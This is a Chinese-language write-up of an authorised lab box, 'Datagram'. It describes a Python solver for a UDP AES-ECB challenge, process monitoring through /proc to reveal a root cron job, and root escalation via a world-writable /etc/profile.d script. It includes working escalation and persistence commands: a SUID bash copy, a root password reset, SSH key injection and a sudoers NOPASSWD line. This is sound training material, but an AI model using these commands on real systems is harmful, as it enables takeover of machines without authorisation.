# Datagram 靶机复盘：UDP AES 挑战到 profile.d 提权

> 本文记录的是隔离环境中的授权靶机复盘。协议自动化与定时任务侧信道验证均不可用于未授权系统。

| 项目 | 本次记录 |
|------|----------|
| 靶机 | Datagram（maze-sec / Sublarge） |
| 目标地址 | 192.168.134.73（Kali `192.168.134.4`） |
| 系统 | Alpine Linux / musl |
| 开放端口 | TCP 22（SSH）；UDP 500（自定义 AES 挑战，伪装 isakmp） |
| 最终路径 | UDP 十轮 AES-128-ECB → `longly` → 666 的 `profile.d` + cron `bash -l` → root |

![环境](/content/datagram/image-01.webp)
![主机发现](/content/datagram/image-02.webp)

## 1. 攻击链概览

TCP 几乎只有 SSH，真正的入口在 **500/udp**。解完十轮 AES 拿到 SSH 口令进用户；提权不是 `/tmp` 上那颗假 SUID，而是可写的 `/etc/profile.d/10-demo.sh`，被 root 每分钟一次的 `bash -l` 定时任务加载。

```text
nmap：TCP 仅 22；UDP 500 伪 ISAKMP
  → 自定义服务：10 轮 AES-128-ECB 解密挑战
  → drain-read 自动化 → SSH longly:Ym0C1T05 + user flag
  → 排除 /tmp SUID（nosuid）、sudo、内核误报
  → /etc/profile.d/10-demo.sh 权限 666
  → /proc 侧信道确认 cron：bash -l -c "id"
  → 改 payload（改密 / 写密钥等）→ root flag
```

## 2. 侦察：TCP 很少，看 UDP

![TCP 扫描](/content/datagram/image-03.webp)
![UDP 500](/content/datagram/image-04.webp)

| 端口 | 协议 | 备注 |
|------|------|------|
| 22/tcp | OpenSSH 10.3 | 有凭据才能进 |
| 500/udp | 指纹像 isakmp | **实为自定义挑战服务** |

`nmap -sV` 打 500/udp 时，DNS / SIP / NTP / SNMP 等探针都回**同一段英文提示**——真 IKE 不会这样：

```text
Complete 10 AES-128 ECB decryption challenges to get flag
Round 1/10
Key(hex):40db7f4f5f17ee12ada6250f6fd87814
Cipher(hex):4468fd0ddbad57e472b2d5bf32bab8b7
Input plaintext:
```

> 教训：`-sV` 的指纹原文（SF 行）要细读，异样文本往往就是入口。

## 3. UDP 挑战：AES-128-ECB 十轮自动化

### 3.1 协议要点

- 每轮下发 16 字节 key + 密文（1～2 块）
- 解密：AES-128-ECB，去掉 PKCS7；明文多为 8～16 位 `[a-z0-9]`
- 答案按 **ASCII** 回传（服务端字节级比较 `strip()` 后的明文）
- 10 轮全对 → 给出 SSH：`longly:Ym0C1T05`

### 3.2 最深的坑：一个请求多个响应

第一版「发一包 → 读一包」会一直 `Wrong answer. Session invalidated`。  
解密本身没错（填充合法），穷举十几种答案格式也全错——**全错本身就是信息：问题不在答案，在交互时序**。

排空实验发现：**一个 UDP 包会触发两个响应**（欢迎语 + Round 1）。服务端把「收到的每个包」都当成上一题的答案：

```text
错误流程：发 start → 只读到欢迎（R1 残留在缓冲）
         → 再发 start【被当成 R1 答案，会话作废】
         → 再读到缓冲里的 R1 → 真答案打到死会话
```

修复原则：**send → 循环 `recvfrom` 直到超时（drain）→ 再解析 → 再 send**。

### 3.3 求解脚本

```python
#!/usr/bin/env python3
"""UDP 500 AES-128 ECB 解密挑战自动化（每包触发可排空多响应包）"""
import socket, re, sys
from Crypto.Cipher import AES

HOST, PORT = "192.168.134.73", 500

def solve(fmt="ascii"):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(8)

    def send_drain(payload):
        s.sendto(payload, (HOST, PORT))
        buf = []
        while True:
            try:
                buf.append(s.recvfrom(65535)[0].decode(errors="replace"))
            except socket.timeout:
                break
        return "".join(buf)

    resp = send_drain(b"start")  # 欢迎 + Round 1
    for rnd in range(1, 11):
        m = re.search(
            r"Key\(hex\):([0-9a-f]{32})\nCipher\(hex\):([0-9a-f]+)", resp
        )
        if not m:
            return resp
        key, ct = bytes.fromhex(m.group(1)), bytes.fromhex(m.group(2))
        pt = AES.new(key, AES.MODE_ECB).decrypt(ct)
        unpad = (
            pt[: -pt[-1]]
            if 1 <= pt[-1] <= 16 and pt.endswith(bytes([pt[-1]]))
            else pt
        )
        print(f"[Round {rnd}] pt={unpad!r}")
        reply = unpad.decode(errors="replace") if fmt == "ascii" else unpad.hex()
        resp = send_drain(reply.encode())
        print(f"  resp: {resp[:150]!r}")
        if (
            "flag" in resp.lower()
            and "Round" not in resp
            and "challenge" not in resp.lower()
        ):
            return resp
    return resp

if __name__ == "__main__":
    print(solve(sys.argv[1] if len(sys.argv) > 1 else "ascii"))
```

跑通后拿到凭据。进盒子后对照 `/opt/chal.py` 也能对上：

```python
sock.settimeout(30)                    # 30s 超时 → 手算不现实，必须自动化
response, _ = sock.recvfrom(1024)      # 下一个包即本轮答案
if response.strip() != plain: ...      # 答错 → 会话作废
dead_ports[ip] = port                  # 按 (ip, port) 拉黑
```

脚本每次新建 socket（随机源端口）才能反复试错格式；排错过程里还有 `test_formats.py` 一类穷举器，用来证明「不是答案格式的问题」。

![挑战求解 / SSH](/content/datagram/image-05.webp)

```bash
ssh longly@192.168.134.73   # Ym0C1T05
cat ~/user.txt
# flag{user-58cd37ce6fe2ba731bfcfc11ed9462af}
```

## 4. 提权侦察：先排除假钩子

| 路径 | 结果 |
|------|------|
| `sudo -l` / doas | longly 不在 sudoers，无 doas.conf |
| **`/tmp/bash` SUID** | **陷阱**：OpenRC 服务开机 `cp /bin/bash /tmp && chmod 4755`，但 fstab 刻意 `tmpfs /tmp nosuid` → SUID 永远无效；`/proc/mounts` 一眼判死 |
| SUID/SGID 全表 | 多为 shadow / util-linux / busybox 标准件 |
| 可写配置 | **`/etc/profile.d/10-demo.sh` 权限 `666`（`-rw-rw-rw-`）** ★ |
| root crontab | `-rw-------`，字节数大于 Alpine 默认 → **必有自定义行**，但不可读 |
| 内核 CVE（如 linpeas 报的版本启发式） | reproducer 行为像已修复内核 → **实证排除** |
| 本地监听 | 仍只有 22 / 500 一类，无隐藏服务 |
| 喷 root SSH | 弱口令未命中（非预期） |

![可写 profile.d](/content/datagram/image-06.webp)
![枚举补充](/content/datagram/image-07.webp)
![nosuid / 其它排除](/content/datagram/image-08.webp)

## 5. 真链：666 的 profile.d + cron `bash -l`

### 5.1 侧信道实锤定时任务

crontab 读不到（`600`），日志也常常读不到。用 **0.2s 粒度扫 `/proc`**，记录新出现进程，并记下 **ppid**：

```python
# procmon.py 核心思路
for d in os.listdir("/proc"):
    if d.isdigit() and int(d) not in seen:
        cmd = open(f"/proc/{d}/cmdline", "rb").read().replace(b"\0", b" ")
        ppid = open(f"/proc/{d}/stat").read().split(")")[-1].split()[1]
        # 打日志：时间 / pid / ppid / cmd
```

几分钟后能看到类似：

```text
08:57:00 ppid=2257(crond) cmd=/bin/bash -c bash -l -c "id"
08:58:00 ppid=2257(crond) cmd=bash -l -c id
```

也就是 root crontab 多出来的那一行本质是：

```cron
* * * * * bash -l -c "id"
```

每分钟一次 root 级 **login shell**：`bash -l` → source `/etc/profile` → 执行 `/etc/profile.d/*.sh`（含 666 的 `10-demo.sh`）。这就是触发器。

### 5.2 payload

往 `10-demo.sh` 里加命令即可。本次落地大致是三重保险（`/var/tmp` 在 ext4 上，不是 nosuid）：

```sh
cp /bin/bash /var/tmp/bash
chmod 6755 /var/tmp/bash
echo 'root:Pwn3d!2026' | chpasswd
# + 向 /root/.ssh/authorized_keys 追加公钥
```

一分钟后即可 `su` / SSH 进 root：

![写入后的 10-demo.sh / 提权](/content/datagram/image-09.webp)
![root flag](/content/datagram/image-10.webp)

```text
flag{root-d178386de0eab898132c8050efffd30d}
```

事后看法（笔记里也写了）：**往 `/etc/sudoers.d/` 给 `longly ALL=(ALL) NOPASSWD: ALL` 可能更好**——少动 root 原密码；cron 每分钟跑一次时，改密等于反复破坏凭据，噪声很大。写公钥也应用 `grep -q` 判重再 `>>`，否则每分钟膨胀一行。

### 5.3 无 root 时挖定时任务的习惯

1. **元数据差分**：`ls -la /etc/crontabs/` 字节数 ≠ 发行版默认 → 只知「有自定义」  
2. **进程侧信道**：高频扫 `/proc`，`ppid=crond` 直接暴露命令行 → 知「是什么」  
3. **设计反推**：666 的 profile.d 必有触发器 → 排查谁以 root 跑 login shell（cron `bash -l` / getty 等）

## 6. 关键知识点

| 要点 | 复盘结论 |
|------|----------|
| UDP 自定义协议 | 必用排空读；一个请求可能多个响应，状态机会整体错位 |
| 「全错」也是信号 | 合理编码全被拒时，先怀疑对话轮次，别死磕答案格式 |
| SUID | 先验 `/proc/mounts` 有无 `nosuid` |
| 不可读 crontab | 字节数差分 + `/proc` 高频采样 |
| linpeas CVE | 版本启发式命中后，用 reproducer 实证再投入 |
| 持久化 | `sudoers.d` 加行通常优于反复改 root 密码；追加公钥要幂等 |
| 靶机设计 | `/tmp` 假 SUID 与 `bash -l` + 666 profile 一假一真，考的是验证习惯 |

## 7. 复盘

Datagram 两个考点都很「纯」：前半段逼你把 UDP 状态机读对（drain-read），后半段逼你在看不到 crontab 时仍能证明 `bash -l` 在跑。`/tmp` 假 SUID 与 666 的 `profile.d` 一假一真，考的都是验证习惯而不是工具熟练度。自动化修好之后，整台机其实不长——难的是别走错钩子。

相关材料也放在 Gitee：[Sublarge靶机Datagram](https://gitee.com/zx67834/my-target-drone-review/tree/master/Sublarge%E9%9D%B6%E6%9C%BADatagram)（`solve.py` / `procmon.py` / `test_formats.py` 等）。
